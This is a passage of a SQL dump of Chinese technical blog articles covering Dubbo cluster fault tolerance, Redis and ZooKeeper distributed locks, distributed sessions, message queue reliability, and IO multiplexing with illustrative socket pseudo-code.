一次调用失败就立即失败，常见于写操作\n3. failsafe cluster模式\n	出现异常时忽略掉，常用于不重要的接口调用，比如记录日志\n4. failbackc cluster模式\n	失败了后台自动记录请求，然后定时重发，比较适合于写消息队列这种\n5. forking cluster\n	并行调用多个provider，只要一个成功就立即返回\n6. broadcacst cluster\n	逐个调用所有的provider\n\n```', 0, 0, 86, 0, 0, '2019-12-09 12:26:01', '2019-12-09 12:26:01', 0, 0);
INSERT INTO `article` VALUES (64, 1, '分布式锁Redis与zookeeper', '2019/10/1571029825_mmexport1570975300426.jpg', '### Redis分布式锁\n#### 分布式锁实现\n![Redis分布式锁lua脚本删除key.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623560781_Redis-分布式锁-lua脚本删除key.png)\n```java\n1. redis创建分布式锁有一个超时时间设置,这个设计的目的是防止创建锁的进程宕机,导致后续其他等待锁释放的进程迟迟阻塞造成死锁\n2. 但是由于这个这个超时设置,引发了释放锁时不能直接删除key的问题,所以必须在创建锁的时候传递一个唯一的值,作为锁的唯一标识,另外,redis中的get和del操作不是原子性的,实际上会有进程安全问题\n3. 释放锁时,必须让lua脚本检查当前锁的value是否与本进程创建锁时的value一直,确保删除的是我自己上的锁,不是别的进程的锁\n4. lua有学习成本,仅为了实现分布式锁,而付出更多的时间精力是不合算的\n5. 所幸有个redisson的redis操作客户端api,提供了许多正常jedis客户端没有的api,其中就有这个分布式锁的api\n\n```\n#### redisson的分布锁实现逻辑\n![RedisRedisson分布式锁加锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624210664_Redis-Redisson分布式锁-加锁.png)\n![RedisRedisson分布式锁抢锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624245209_Redis-Redisson分布式锁-抢锁.png)\n![RedisRedisson分布式锁释放锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624245210_Redis-Redisson分布式锁-释放锁.png)\n```java\n1. redisson支持可重入锁,也就是线程获取锁后可以多次获取锁,记录次数,逐次释放\n2. redisson加锁时一般以商品id_lock为key,以该线程uuid和可重入锁次数为value\n3. 加锁后会启动一个watchdog，每隔10s去检查一下这个锁是否还被当前客户端持有，如果是的话，重新刷新一下key的生存时间为30s\n4. 当其他客户端尝试加锁,表示被别的客户端加锁了，此时他就会陷入一个无限循环，阻塞住自己，不断尝试获取锁\n5. 释放锁时,lua脚本会检查key值的uuid线程与当前线程uuid值是否相同,并将可重入锁次数减1,当次数为0时删除该key\n\n如果加锁后的客户端宕机了,那么redisson框架启动的后台watchdog线程也就没有了,锁也会因为过期时间到期而消失\n如果锁被释放,那么会关闭该watchdog的检查调度\n\n```\n#### RedLock\n![Redis分布式锁RedLock.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623560782_Redis-分布式锁-RedLock.png)\n```java\n// RedLock\n1. 尽管看似一切执行的很好,但是redis数据复制同步的时候,可能因为master宕机,未将锁信息传递给slave的情况\n2. 而slave成为了新的master就没有这条锁数据,这把锁就这么没了\n3. 在单机redis和单master的主从哨兵架构中无法解决这个问题\n4. redis提出了一种redlock算法的方案解决这个问题,要求redis是多master的redis cluster架构\n5. redlock会向多个master节点同时依次创建锁,若2N+1个master节点成功创建锁,则认为这次创建锁操作成功\n6. 这是利用集群的健壮可用性来尽量避免宕机锁丢失的情况\n7. 但是这依然会有缺陷,在极端情况下,锁依旧会丢失\n8. 所以redis分布式锁是一个不怎么靠谱的分布式锁解决方案,它只能尽量实现分布式锁,但并不能严格保证没有问题\n9. 其次是redis分布式锁需要不断去自己程序里获取锁,比较消耗性能,还需要计算时间等情况,还需要去学习了解lua和redisson具体操作\n10. redis实现分布锁它不仅实现复杂而且并不是严格保证分布式锁没有问题\n\n```\n\n### zookeeper分布式锁\n#### 普通临时节点的分布式锁实现 \n![zookeeper分布式锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623562816_zookeeper-分布式锁.png)\n```java\n// 普通临时节点的分布式锁实现\n1. zookeeper锁是主流的分布式锁解决方案,进程创建临时节点,谁成功创建临时节点,谁就获取到了锁,zookeeper保证创建节点时是原子性的\n2. 创建临时节点获取到锁的进程即使宕机了,临时节点也会因为进程宕机而被zookeeper监测到,把临时节点删除使得锁给释放\n3. 相对于redis不断尝试获取锁的进程而言,zookeeper获取锁的等待进程们只需要注册一个监听锁节点的监听器而已,这减少了性能的开销\n4. zookeeper集群的底层数据同步会尽量保证不会出现锁丢失的情况\n5. zookeeper实现分布式锁,它的实现逻辑清晰,学习成本低\n6. 但是zookeeper因为集群主从架构中只有leader一个写机器的原因,不适用于大量写请求操作的场景\n\n// 网络丢包导致分布式锁丢失\n1. 如果连接zk的客户端与zk的网络连接出现问题,比如客户端的心跳包一直丢包,但实际上客户端并没有宕机\n2. 但是因为网络问题丢包的时候,zk以为这个客户端宕机了,于是把它创建的临时节点删除了\n3. 此时客户端会依然觉得自己拿着锁在操作,实际上zk早就把锁的临时节点给删除了\n\n// 普通临时节点实现的潜在的问题\n1. 这种简单的分布式锁会造成羊群效应,性能较差\n2. 羊群效应指的是大量客户端同时竞争一个锁,释放锁后的通知会通知大量的客户端,而实际上只能一个客户端能拿到,这造成了过量的性能损耗和网络负载\n\n```\n#### 临时顺序节点的分布锁实现\n![Zookeeper分布式锁临时顺序节点.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624249524_Zookeeper-分布式锁-临时顺序节点.png)\n```java\n// 羊群效应\n1. 如果上百个客户端争抢一个锁，此时会导致任何一个客户端释放锁的时候，zk反向通知上百个客户端\n2. 上百个客户端又要发送请求到zk去尝试创建锁\n3. 上百个人客户端要加锁,无序的,是真的像抢一样\n4. 这样造成很多没必要的请求和网络开销，会加重网络的负载\n\n// 临时顺序节点的分布式锁实现\n1. 临时顺序节点的实现就是为了避免羊群效应\n2. 客户端加锁的临时节点将会以顺序排队进行,zk保证了加锁时的原子性\n3. 每一个尝试获取锁的客户端在没轮到自己的序号时都会监听前一个临时顺序节点的变化,像排队一样\n4. 当前一个临时顺序节点释放锁后,得到通知轮到自己才会去加锁 \n4. 这样有序的加锁排队,避免了大量客户端一堆窝的抢锁,造成的性能开销和网络负载\n\n\n```', 0, 0, 120, 0, 0, '2019-12-11 13:10:37', '2020-01-10 13:10:37', 0, 0);
INSERT INTO `article` VALUES (65, 1, '分布式会话问题及解决方式', '2019/10/1571031388_mmexport1570973957195.jpg', '### 分布式会话问题\n![分布式会话问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623515755_分布式会话问题.png)\n```java\n1. 单机系统时应该只有一台机器,每次与客户端会话的都是那一台机器,所以不会产生分布式会话问题\n2. 但是要是分布式系统,多台机器,那就出问题了,客户端每次会话的可能不是上一次会话的机器\n3. 我们需要可以让多台机器可以与一台客户端进行会话\n\n// 解决方式\n1. tomcat+redis,让tomcat把session数据放入到redis中,让其他机器的tomcat也能获取session数据\n2. springsession+redis,让内部程序springsession把session数据放入到redis中,让其他机器的springsession也能获取session数据\n3. jwt+redis,不依靠原生的session了,jwt作为标识,我们自己传递客户端与服务端的数据,放入到redis中,让其他机器的服务端获取数据\n\n```\n### 解决方式\n#### tomcat+redis\n![分布式会话问题解决方式tomcat加redis.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623515755_分布式会话问题解决方式-tomcat加redis.png)\n````java\n1. 分布式会话的这个东西重耦合在tomcat这种web容器中，如果我要将web容器迁移成jetty,那么配置全部要改\n\n```\n#### spring session+redis\n![分布式会话问题解决方式springsession加redis.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623515755_分布式会话问题解决方式-springsession加redis.png)\n```java\n1. 相比于tomcat+redis,比较好的还是基于java一站式解决方案\n2. spring基本上包掉了大部分的我们需要使用的框架了，所以用sping session是一个很好的选择。\n\n```\n#### jwt+redis\n![分布式会话问题解决方式jwt.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623515756_分布式会话问题解决方式-jwt.png)\n```java\n1. 客户端把jwt放到cookie里,每次请求将jwt从请求头里传递过来\n2. 这种是常用的方式,非常的好用,jwt中还可以放入一些信息,比如用户id,让服务端知道是哪个用户的jwt\n3. jwt虽然防止了篡改，但信息还是透明的，不要放敏感信息\n\n```', 0, 0, 61, 0, 0, '2019-12-14 13:36:39', '2019-12-14 13:36:39', 0, 0);
INSERT INTO `article` VALUES (66, 1, '消息队列常见问题', '2021/6/1623044091_mmexport1623043856150.jpg', '### 消息队列作用与优缺点\n#### 消息队列解耦\n![消息队列解耦.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623046971_消息队列-解耦.png)\n\n#### 消息队列异步\n![消息队列异步.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623050263_消息队列-异步.png)\n\n#### 消息队列削峰\n![消息队列削峰.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623050263_消息队列-削峰.png)\n\n```java\n// 消息队列作用与优缺点\n最重要的三个点\n解耦: 系统和多个系统耦合,导致频繁维护\n异步: 避免同步调用,造成等待多系统的时间\n削峰: 大量请求慢慢拉取,避免系统因为高峰积压而崩溃\n\n// 缺点\n系统可用性降低,系统引入的外部依赖越多,越容易挂掉\n系统复杂性提高,多种问题需要面对,幂等性、重复消费,消息丢失,顺序性\n一致性问题,节点数据不一致\n\n// 常见的消息队列都有什么优缺点\nactivemq:\n非常成熟，在业内大量的公司以及项目中都有应用\n偶尔会有较低概率丢失消息\n社区以及国内应用都越来越少，官方社区维护热情不高\n主要是基于解耦和异步来用的，较少在大规模吞吐的场景中使用\n现已不推荐使用\n\nrabbitmq:\nerlang语言开发，性能极其好，延时很低；\n吞吐量到万级，MQ功能比较完备\n而且开源提供的管理界面非常棒，用起来很好用\n社区相对比较活跃，几乎每个月都发布几个版本\n在国内一些互联网公司近几年用rabbitmq也比较多一些\n但是问题也是显而易见的，RabbitMQ确实吞吐量会低一些，这是因为他做的实现机制比较重。\nerlang开发，国内没有多少公司可以erlang源码级别的研究和定制。没这个实力的话，确实偶尔会有一些问题。\nerlang语言本身带来的问题。很难读源码，很难定制和掌控,基本职能依赖于开源社区的快速维护和修复bug。\n\nrocketmq:\n接口简单易用，在阿里大规模应用过，有阿里品牌保障\n日处理消息上百亿之多，可以做到大规模吞吐，性能也非常好，分布式扩展也很方便，社区维护还可以，可靠性和可用性都是ok的，还可以支撑大规模的topic数量，支持复杂MQ业务场景\n一个很大的优势在于，阿里出品都是java系的，我们可以自己阅读源码，定制自己公司的MQ，可以掌控\n社区活跃度相对较为一般，不过也还可以，接口这块不是按照标准JMS规范走的有些系统要迁移需要修改大量代码\n阿里出台的技术，你得做好这个技术万一被抛弃，社区黄掉的风险\n\nkafka:\nkafka的特点其实很明显，就是仅仅提供较少的核心功能，但是提供超高的吞吐量，ms级的延迟，极高的可用性以及可靠性，而且分布式可以任意扩展\n同时kafka最好是支撑较少的topic数量即可，保证其超高吞吐量\n而且kafka唯一的一点劣势是有可能消息重复消费，那么对数据准确性会造成极其轻微的影响，在大数据领域中以及日志采集中，这点轻微影响可以忽略\n这个特性天然适合大数据实时计算以及日志收集\n```\n### 保证消息队列的可用性\n#### RabbitMQ的高可用性\n![消息队列RabbitMQ普通集群模式.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623052491_消息队列-RabbitMQ-普通集群模式.png)\n![消息队列RabbitMQ镜像集群模式.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623052491_消息队列-RabbitMQ-镜像集群模式.png)\n```java\n// RabbitMQ的高可用性\nrabbitmq有三种模式：单机模式，普通集群模式，镜像集群模式\n(1）单机模式\n就是demo级别的，一般就是你本地启动小项目了玩玩儿的，没人生产用单机模式\n\n(2）普通集群模式\n1. 多台机器上启动多个rabbitmq实例，每个机器启动一个。但是你创建的queue，只会放在一个rabbtimq实例上，每个实例都同步queue的元数据。你消费的时候，实际上如果连接到了另外一个实例，那么那个实例会从queue所在实例上拉取数据过来。\n2. 没做到所谓的高可用，就是个普通集群。因为这导致你要么消费者每次随机连接一个实例然后拉取数据，要么固定连接那个queue所在实例消费数据，前者有数据拉取的开销，后者导致单实例性能瓶颈。\n3. 如果那个放queue的实例宕机了，会导致接下来其他实例就无法从那个实例拉取，如果你开启了消息持久化，让rabbitmq落地存储消息的话，消息不一定会丢，得等这个实例恢复了，然后才可以继续从这个queue拉取数据。 \n这就没有什么所谓的高可用性可言了，这方案主要是提高吞吐量的，就是说让集群中多个节点来服务某个queue的读写操作。\n\n(3）镜像集群模式\n1. 这种模式，才是所谓的rabbitmq的高可用模式，跟普通集群模式不一样的是，你创建的queue，\n无论元数据还是queue里的消息都会存在于多个实例上，然后每次你写消息到queue的时候，都会自动把消息到多个实例的queue里进行消息同步。\n2. 好处在于，你任何一个机器宕机了，别的机器都可以用。\n3. 坏处在于\n（1）性能开销也太大了，消息同步所有机器，导致网络带宽压力和消耗很重！\n（2）没有扩展性可言了，如果某个queue负载很重，你加机器，新增的机器也包含了这个queue的所有数据，并没有办法线性扩展你的queue\n\n```\n#### kafka的高可用性\n![消息队列Kafka集群.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623054582_消息队列-Kafka-集群.png)\n```java\n1. kafka一个最基本的架构认识：多个broker组成，每个broker是一个节点；\n你创建一个topic，这个topic可以划分为多个partition，每个partition可以存在于不同的broker上，每个partition就放一部分数据。\n2. 这就是天然的分布式消息队列，就是说一个topic的数据，是分散放在多个机器上的，每个机器就放一部分数据。\n3. 实际上rabbitmq之类的，并不是分布式消息队列，他就是传统的消息队列，只不过提供了一些集群、HA的机制而已，因为无论怎么玩儿，rabbitmq一个queue的数据都是放在一个节点里的，镜像集群下，也是每个节点都放这个queue的完整数据。\nkafka 0.8以前，是没有HA机制的，就是任何一个broker宕机了，那个broker上的partition就废了，没法写也没法读，没有什么高可用性可言。\nkafka 0.8以后，提供了HA机制\n4. HA机制，就是replica副本机制。每个partition的数据都会同步到其他机器上，形成自己的多个replica副本。然后所有replica会选举一个leader出来，那么生产和消费都跟这个leader打交道，然后其他replica就是follower。写的时候，leader会负责把数据同步到所有follower上去，读的时候就直接读leader上数据即可。\n5. 如果某个broker宕机了，那个broker上面的partition在其他机器上都有副本的，如果这上面有某个partition的leader，那么此时会重新选举一个新的leader出来，大家继续读写那个新的leader即可。这就有所谓的高可用性了\n6. 写数据的时候，生产者就写leader，然后leader将数据落地写本地磁盘，接着其他follower自己主动从leader来pull数据。一旦所有follower同步好数据了，就会发送ack给leader，leader收到所有follower的ack之后，就会返回写成功的消息给生产者。（当然，这只是其中一种模式，还可以适当调整这个行为）\n消费的时候，只会从leader去读，但是只有一个消息已经被所有follower都同步成功返回ack的时候，这个消息才会被消费者读到\n```\n\n### 消息的重复消费\n```java\n// 重复消费\n1. kafka实际上有个offset的概念，就是每个消息写进去，都有一个offset，代表他的序号，然后consumer消费了数据之后，每隔一段时间，会把自己消费过的消息的offset提交一下，代表我已经消费过了，下次我要是重启啥的，你就让我继续从上次消费到的offset来继续消费吧。\n2. 但是凡事总有意外，比如我们之前生产经常遇到的，就是你有时候重启系统，看你怎么重启了，如果碰到点着急的，直接kill进程了，再重启。这会导致consumer有些消息处理了，但是没来得及提交offset，尴尬了。重启之后，少数消息会再次消费一次。\n3. 其实重复消费不可怕，可怕的是你没考虑到重复消费之后，怎么保证幂等性。\n\n// 怎么保证消息队列消费的幂等性？\n幂等性，通俗点说，就一个数据，或者一个请求，给你重复来多次，你得确保对应的数据是不会改变的，不能出错。\n其实还是得结合业务来思考，给几个思路：\n（1）比如你拿个数据要写库，你先根据主键查一下，如果这数据都有了，你就别插入了，update一下好吧\n（2）比如你是写redis，那没问题了，反正每次都是set，天然幂等性\n (3）比如你不是上面两个场景，那做的稍微复杂一点，你需要让生产者发送每条数据的时候，里面加一个全局唯一的id，类似订单id之类的东西，然后你这里消费到了之后，先根据这个id去比如redis里查一下，之前消费过吗？如果没有消费过，你就处理，然后这个id写redis。如果消费过了，那你就别处理了，保证别重复处理相同的消息即可。\n如何保证MQ的消费是幂等性的，需要结合具体的业务来看\n注意保证幂等性的同时要注意多线程的并发问题\n\n```\n### 消息的丢失\n```java\n丢数据，mq一般分为两种，要么是mq自己弄丢了，要么是我们消费的时候弄丢了\nrabbitmq这种mq，一般来说都是承载公司的核心业务的，数据是绝对不能弄丢的\n// rabbitmq\n(1）生产者弄丢了数据\n1. 生产者将数据发送到rabbitmq的时候，可能数据就在半路给搞丢了，因为网络啥的问题，都有可能。\n2. 可以选择用rabbitmq提供的事务功能，就是生产者发送数据之前开启rabbitmq事务（channel.txSelect），然后发送消息，如果消息没有成功被rabbitmq接收到，那么生产者会收到异常报错，此时就可以回滚事务（channel.txRollback），然后重试发送消息；如果收到了消息，那么可以提交事务（channel.txCommit）。但是问题是，rabbitmq事务机制一搞，基本上吞吐量会下来，因为太耗性能。\n3. 一般来说，如果你要确保说写rabbitmq的消息别丢，可以开启confirm模式，在生产者那里设置开启confirm模式之后，你每次写的消息都会分配一个唯一的id，然后如果写入了rabbitmq中，rabbitmq会给你回传一个ack消息，告诉你说这个消息ok了。如果rabbitmq没能处理这个消息，会回调你一个nack接口，告诉你这个消息接收失败，你可以重试。而且你可以结合这个机制自己在内存里维护每个消息id的状态，如果超过一定时间还没接收到这个消息的回调，那么你可以重发。\n4. 事务机制和cnofirm机制最大的不同在于，事务机制是同步的，你提交一个事务之后会阻塞在那儿，但是confirm机制是异步的，你发送个消息之后就可以发送下一个消息，然后那个消息rabbitmq接收了之后会异步回调你一个接口通知你这个消息接收到了。所以一般在生产者这块避免数据丢失，都是用confirm机制的。\n\n(2) rabbitmq弄丢了数据\n1. rabbitmq自己弄丢了数据,你必须开启rabbitmq的持久化，就是消息写入之后会持久化到磁盘，哪怕是rabbitmq自己挂了，恢复之后会自动读取之前存储的数据，一般数据不会丢。除非极其罕见的是，rabbitmq还没持久化，自己就挂了，可能导致少量数据会丢失的，但是这个概率较小。\n2. 设置持久化有两个步骤，第一个是创建queue的时候将其设置为持久化的，这样就可以保证rabbitmq持久化queue的元数据，但是不会持久化queue里的数据；第二个是发送消息的时候将消息的deliveryMode设置为2，就是将消息设置为持久化的，此时rabbitmq就会将消息持久化到磁盘上去。\n3. 必须要同时设置这两个持久化才行，rabbitmq哪怕是挂了，再次重启，也会从磁盘上重启恢复queue，恢复这个queue里的数据。而且持久化可以跟生产者那边的confirm机制配合起来，只有消息被持久化到磁盘之后，才会通知生产者ack了，所以哪怕是在持久化到磁盘之前,rabbitmq挂了，数据丢了，生产者收不到ack，你也是可以自己重发的。 \n4. 哪怕是你给rabbitmq开启了持久化机制，也有一种可能，就是这个消息写到了rabbitmq中，但是还没来得及持久化到磁盘上，结果不巧，此时rabbitmq挂了，就会导致内存里的一点点数据会丢失。\n5. rabbitmq是可以设置过期时间的，就是TTL，如果消息在queue中积压超过一定的时间就会被rabbitmq给清理掉，这个数据就没了,所以这个是一定不能用的\n\n(3) 消费端弄丢了数据\n1. rabbitmq如果丢失了数据，主要是因为你消费的时候，刚消费到，还没处理，结果进程挂了，比如重启了，那么就尴尬了，rabbitmq认为你都消费了，这数据就丢了。\n2. 这个时候得用rabbitmq提供的ack机制，简单来说，就是你关闭rabbitmq自动ack，可以通过一个api来调用就行，然后每次你自己代码里确保处理完的时候，再程序里ack一把。这样的话，如果你还没处理完，不就没有ack？那rabbitmq就认为你还没处理完，这个时候rabbitmq会把这个消费分配给别的consumer去处理，消息是不会丢的。\n3. 注意ack前保证你的业务逻辑中数据库事务已经提交,否则消息消费了消息,数据库事务却回滚了\n\n// kafka\n(1) 消费端弄丢了数据\n1. 唯一可能导致kafka消费者弄丢数据的情况，就是说，你那个消费到了这个消息，然后消费者那边自动提交了offset，让kafka以为你已经消费好了这个消息，其实你刚准备处理这个消息，你还没处理，你自己就挂了，此时这条消息就丢咯。\n2. kafka会自动提交offset，那么只要关闭自动提交offset，在处理完之后自己手动提交offset，就可以保证数据不会丢。但是此时确实还是会重复消费，比如你刚处理完，还没提交offset，结果自己挂了，此时肯定会重复消费一次，自己保证幂等性就好了。\n3. kafka消费者消费到了数据之后是写到一个内存的queue里先缓冲一下，结果有的时候，你刚把消息写入内存queue，然后消费者会自动提交offset。此时我们重启了系统，就会导致内存queue里还没来得及处理的数据就丢失了\n\n(2) kafka弄丢了数据\n1. kafka某个broker宕机，然后重新选举partiton的leader时。要是此时其他的follower刚好还有些数据没有同步，结果此时leader挂了，然后选举某个follower成leader之后，他不就少了一些数据？这就丢了一些数据啊。\n2. 此时一般是要求起码设置如下4个参数：\n	(1) 给这个topic设置replication.factor参数：这个值必须大于1，要求每个partition必须有至少2个副本\n	(2) 在kafka服务端设置min.insync.replicas参数：这个值必须大于1，这个是要求一个leader至少感知到有至少一个follower还跟自己保持联系，没掉队，这样才能确保leader挂了还有一个follower吧\n	(3) 在producer端设置acks=all：这个是要求每条数据，必须是写入所有replica之后，才能认为是写成功了\n	(4) 在producer端设置retries=MAX（很大很大很大的一个值，无限次重试的意思）：这个是要求一旦写入失败，就无限重试，卡在这里了\n\n(3) 生产者会不会弄丢数据\n1. 如果按照上述的思路设置了ack=all，一定不会丢，要求是，你的leader接收到消息，所有的follower都同步到了消息之后，才认为本次写成功了。如果没满足这个条件，生产者会自动不断的重试，重试无限次。\n\n// 消息堆积导致的丢失\n1. 消息积压在mq里，那么如果你很长时间都没处理掉，此时导致mq都快写满了，这个时候没有办法\n\n// 处理堆积的消息\n一般这个时候，只能操作临时紧急扩容了，具体操作步骤和思路如下：\n(1）先修复consumer的问题，确保其恢复消费速度，然后将现有cnosumer都停掉\n(2）新建一个topic，partition是原来的10倍，临时建立好原先10倍或者20倍的queue数量\n(3）然后写一个临时的分发数据的consumer程序，这个程序部署上去消费积压的数据，消费之后不做耗时的处理，直接均匀轮询写入临时建立好的10倍数量的queue\n(4）接着临时征用10倍的机器来部署consumer，每一批consumer消费一个临时queue的数据\n(5）这种做法相当于是临时将queue资源和consumer资源扩大10倍，以正常的10倍速度来消费数据\n(6）等快速消费完积压数据之后，得恢复原先部署架构，重新用原先的consumer机器来消费消息\n\n// 如果消息已经丢失,该怎么解决\n1. 将丢失的那批数据，写个临时程序，一点一点的查出来，然后重新灌入mq里面去，把丢的数据给他补回来。也只能是这样了。\n2. 假设1万个订单积压在mq里面，没有处理，其中1000个订单都丢了，你只能手动写程序把那1000个订单给查出来，手动发到mq里去再补一次\n```\n### 保证消息的顺序性\n![消息队列消息的顺序性.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623058673_消息队列-消息的顺序性.png)\n```java\n// 顺序会错乱的俩场景\n1. 多个consumer,内部调用消费者单线程\n2. 一个consumer,内部调用消费者多线程\n\n// 如何保证消息的顺序性\n1. 一个queue对应一个consumer,内部单线程消费,写N个内存queue，然后N个线程分别消费一个内存queue即可\n\n```', 0, 0, 79, 0, 0, '2019-12-23 13:34:55', '2019-12-23 13:34:55', 0, 0);
INSERT INTO `article` VALUES (67, 1, 'IO多路复用', '2019/9/1567599097_mmexport1567598370337.jpg', '##### 本文章来自https://mp.weixin.qq.com/s/YdIdoZ_yusVWza1PU7lWaw\n### 阻塞 IO\n服务端为了处理客户端的连接和请求的数据，写了如下代码。\n```java\nlistenfd = socket();   // 打开一个网络通信端口\nbind(listenfd);        // 绑定\nlisten(listenfd);      // 监听\nwhile(1) {\n  connfd = accept(listenfd);  // 阻塞建立连接\n  int n = read(connfd, buf);  // 阻塞读数据\n  doSomeThing(buf);  // 利用读到的数据做些什么\n  close(connfd);     // 关闭连接，循环等待下一个连接\n}\n```\n这段代码会执行得磕磕绊绊，就像这样。\n\n![IO多路复用-阻塞IO_代码执行.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E9%98%BB%E5%A1%9EIO_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.gif)\n\n可以看到，服务端的线程阻塞在了两个地方，一个是 accept 函数，一个是 read 函数。\n\n如果再把 read 函数的细节展开，我们会发现其阻塞在了两个阶段。\n\n![IO多路复用-阻塞IO-硬件.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E9%98%BB%E5%A1%9EIO-%E7%A1%AC%E4%BB%B6.gif)\n\n这就是传统的阻塞 IO。\n\n整体流程如下图。\n\n![IO多路复用-阻塞IO-流程.png](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E9%98%BB%E5%A1%9EIO-%E6%B5%81%E7%A8%8B.png)\n\n所以，如果这个连接的客户端一直不发数据，那么服务端线程将会一直阻塞在 read 函数上不返回，也无法接受其他客户端连接。\n\n这肯定是不行的。\n\n### 非阻塞 IO\n为了解决上面的问题，其关键在于改造这个 read 函数。\n\n有一种聪明的办法是，每次都创建一个新的进程或线程，去调用 read 函数，并做业务处理。\n```java\nwhile(1) {\n  connfd = accept(listenfd);  // 阻塞建立连接\n  pthread_create（doWork);  // 创建一个新的线程\n}\nvoid doWork() {\n  int n = read(connfd, buf);  // 阻塞读数据\n  doSomeThing(buf);  // 利用读到的数据做些什么\n  close(connfd);     // 关闭连接，循环等待下一个连接\n}\n```\n这样，当给一个客户端建立好连接后，就可以立刻等待新的客户端连接，而不用阻塞在原客户端的 read 请求上。\n\n![zhaungzai/img/IO多路复用-非阻塞IO-代码执行.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E9%9D%9E%E9%98%BB%E5%A1%9EIO-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.gif)\n\n不过，这不叫非阻塞 IO，只不过用了多线程的手段使得主线程没有卡在 read 函数上不往下走罢了。操作系统为我们提供的 read 函数仍然是阻塞的。\n\n所以真正的非阻塞 IO，不能是通过我们用户层的小把戏，而是要恳请操作系统为我们提供一个非阻塞的 read 函数。\n\n这个 read 函数的效果是，如果没有数据到达时（到达网卡并拷贝到了内核缓冲区），立刻返回一个错误值（-1），而不是阻塞地等待。\n操作系统提供了这样的功能，只需要在调用 read 前，将文件描述符设置为非阻塞即可。\n```java\nfcntl(connfd, F_SETFL, O_NONBLOCK);\nint n = read(connfd, buffer) != SUCCESS);\n```\n这样，就需要用户线程循环调用 read，直到返回值不为 -1，再开始处理业务。\n\n![IO多路复用-非阻塞IO-硬件.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E9%9D%9E%E9%98%BB%E5%A1%9EIO-%E7%A1%AC%E4%BB%B6.gif)\n\n这里我们注意到一个细节。\n\n非阻塞的 read，指的是在数据到达前，即数据还未到达网卡，或者到达网卡但还没有拷贝到内核缓冲区之前，这个阶段是非阻塞的。\n\n当数据已到达内核缓冲区，此时调用 read 函数仍然是阻塞的，需要等待数据从内核缓冲区拷贝到用户缓冲区，才能返回。\n\n整体流程如下图\n\n![IO多路复用-非阻塞IO-流程.png](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-%E9%9D%9E%E9%98%BB%E5%A1%9EIO-%E6%B5%81%E7%A8%8B.png)\n\n### IO多路复用\n为每个客户端创建一个线程，服务器端的线程资源很容易被耗光。\n\n![IO多路复用-IO多路复用-img1.png](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-img1.png)\n\n当然还有个聪明的办法，我们可以每 accept 一个客户端连接后，将这个文件描述符（connfd）放到一个数组里。\n```java\nfdlist.add(connfd);\n```\n然后弄一个新的线程去不断遍历这个数组，调用每一个元素的非阻塞 read 方法。\n```java\nwhile(1) {\n  for(fd <-- fdlist) {\n    if(read(fd) != -1) {\n      doSomeThing();\n    }\n  }\n}\n```\n这样，我们就成功用一个线程处理了多个客户端连接。\n\n![IO多路复用-IO多路复用-img2.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-img2.gif)\n\n你是不是觉得这有些多路复用的意思？\n\n但这和我们用多线程去将阻塞 IO 改造成看起来是非阻塞 IO 一样，这种遍历方式也只是我们用户自己想出的小把戏，每次遍历遇到 read 返回 -1 时仍然是一次浪费资源的系统调用。\n\n在 while 循环里做系统调用，就好比你做分布式项目时在 while 里做 rpc 请求一样，是不划算的。\n\n所以，还是得恳请操作系统老大，提供给我们一个有这样效果的函数，我们将一批文件描述符通过一次系统调用传给内核，由内核层去遍历，才能真正解决这个问题。\n\n### select\nselect 是操作系统提供的系统调用函数，通过它，我们可以把一个文件描述符的数组发给操作系统， 让操作系统去遍历，确定哪个文件描述符可以读写， 然后告诉我们去处理：\n\n![IO多路复用-select-img1.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-select-img1.gif)\n\nselect系统调用的函数定义如下。\n```java\nint select(\n    int nfds,\n    fd_set *readfds,\n    fd_set *writefds,\n    fd_set *exceptfds,\n    struct timeval *timeout);\n// nfds:监控的文件描述符集里最大文件描述符加1\n// readfds：监控有读数据到达文件描述符集合，传入传出参数\n// writefds：监控写数据到达文件描述符集合，传入传出参数\n// exceptfds：监控异常发生达文件描述符集合, 传入传出参数\n// timeout：定时阻塞监控时间，3种情况\n//  1.NULL，永远等下去\n//  2.设置timeval，等待固定时间\n//  3.设置timeval里时间均为0，检查描述字后立即返回，轮询\n```\n服务端代码，这样来写。\n\n首先一个线程不断接受客户端连接，并把 socket 